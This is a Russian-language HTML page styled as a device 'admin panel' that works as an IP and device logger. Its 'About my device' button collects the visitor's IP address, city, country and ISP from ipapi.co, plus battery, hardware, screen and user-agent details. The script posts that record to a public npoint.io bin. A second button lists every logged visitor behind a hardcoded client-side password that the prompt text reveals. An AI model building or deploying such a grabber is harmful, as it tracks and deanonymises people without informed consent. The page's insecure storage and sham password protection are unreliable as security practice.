<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Intelligence System</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .box { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); width: 350px; text-align: center; border: 1px solid #334155; }
        h2 { color: #38bdf8; margin-bottom: 25px; letter-spacing: 1px; }
        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 14px; text-transform: uppercase; }
        .btn-blue { background: #0284c7; color: white; box-shadow: 0 4px 14px rgba(2, 132, 199, 0.4); }
        .btn-green { background: #10b981; color: white; box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4); }
        button:hover { transform: translateY(-2px); opacity: 0.9; }
        #results { margin-top: 25px; text-align: left; background: #020617; padding: 15px; border-radius: 12px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #1e293b; }
        .entry { border-bottom: 1px dashed #334155; padding: 15px 0; font-size: 11px; line-height: 1.6; }
        .entry b { color: #38bdf8; }
        .entry span { color: #fbbf24; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <h2>Админ-Панель</h2>
    <button class="btn-blue" id="save-btn" onclick="collectFullData()">О моем устройстве</button>
    <button class="btn-green" onclick="viewCloudData()">Данные устройств</button>
    <div id="results"></div>
</div>

<script>
    // Твой актуальный URL из скриншота
    const BINS_API = "https://api.npoint.io/e5de1576f58f9afbfba8";

    async function collectFullData() {
        const btn = document.getElementById('save-btn');
        btn.innerText = "Сбор данных...";
        
        // 1. Получаем IP и Геопозицию
        let ipData = { ip: "Неизвестен", city: "Неизвестен", country_name: "Неизвестно", org: "Неизвестен" };
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (res.ok) ipData = await res.json();
        } catch(e) { console.error("Ошибка IP"); }

        // 2. Получаем данные о батарее
        let batteryInfo = "Нет данных";
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Зарядка" : "Разрядка"})`;
            }
        } catch(e) {}

        // 3. Формируем объект со всеми данными
        const fullInfo = {
            time: new Date().toLocaleString("ru-RU"),
            ip: ipData.ip,
            location: `${ipData.city}, ${ipData.country_name}`,
            provider: ipData.org,
            os: navigator.platform,
            cores: navigator.hardwareConcurrency || "Неизвестно",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Неизвестно",
            screen: `${window.screen.width}x${window.screen.height}`,
            battery: batteryInfo,
            userAgent: navigator.userAgent
        };

        try {
            // Читаем текущий список из облака
            const response = await fetch(BINS_API);
            let currentData = await response.json();
            
            // Если там не массив (например, пустой файл), создаем его
            if (!Array.isArray(currentData)) currentData = [];
            
            // Добавляем новую запись в массив
            currentData.push(fullInfo);

            // Отправляем обновленный массив обратно в облако
            const saveResponse = await fetch(BINS_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(currentData)
            });

            if (saveResponse.ok) {
                alert("Данные успешно сохранены в облако!");
            } else {
                alert("Ошибка сервера при сохранении.");
            }
        } catch (e) {
            console.error(e);
            alert("Ошибка сохранения. Убедись, что на npoint.io сохранены скобки []");
        } finally {
            btn.innerText = "О моем устройстве";
        }
    }

    async function viewCloudData() {
        const pass = prompt("Введите пароль (3664):");
        if (pass !== "3664") return alert("Доступ закрыт!");

        const resDiv = document.getElementById('results');
        resDiv.style.display = 'block';
        resDiv.innerHTML = "Синхронизация...";

        try {
            const response = await fetch(BINS_API);
            const logs = await response.json();

            if (!logs || logs.length === 0 || !Array.isArray(logs)) {
                resDiv.innerHTML = "База данных пуста.";
                return;
            }

            // Выводим данные в обратном порядке (новые сверху)
            let html = "";
            [...logs].reverse().forEach((log, i) => {
                html += `
                    <div class="entry">
                        <span>ЛОГ #${logs.length - i} [${log.time}]</span><br>
                        <b>📍 IP:</b> ${log.ip}<br>
                        <b>🌍 Город:</b> ${log.location}<br>
                        <b>🏢 Провайдер:</b> ${log.provider}<br>
                        <b>💻 Система:</b> ${log.os} (${log.cores} ядер, ${log.ram} RAM)<br>
                        <b>🔋 Батарея:</b> ${log.battery}<br>
                        <b>📏 Экран:</b> ${log.screen}<br>
                        <details><summary style="cursor:pointer; color:#38bdf8">UserAgent (подробности)</summary>${log.userAgent}</details>
                    </div>
                `;
            });
            resDiv.innerHTML = html;
        } catch (e) {
            resDiv.innerHTML = "Ошибка при загрузке данных.";
        }
    }
</script>

</body>
</html>
